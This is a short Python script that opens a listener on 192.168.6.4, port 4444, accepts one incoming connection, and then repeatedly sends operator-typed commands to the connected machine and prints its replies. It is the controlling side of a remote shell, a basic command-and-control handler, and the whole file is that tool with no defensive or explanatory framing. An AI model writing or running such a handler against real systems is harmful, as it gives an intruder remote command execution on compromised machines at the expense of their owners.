from socket import *
s = socket(2,1)
s.bind(("192.168.6.4",4444))
s.listen(1)
print("Connected To Port")
print("______________________________\n")


client, addr = s.accept()
print("Connected To"+str(addr)+"\n")
print("______________________________")


    
while True:
    Command = input("Enter Your Command: ")
    if Command.upper() == "F":
        break
    client.send((Command).encode())
    new_data = client.recv(102456).decode()
    print(new_data)


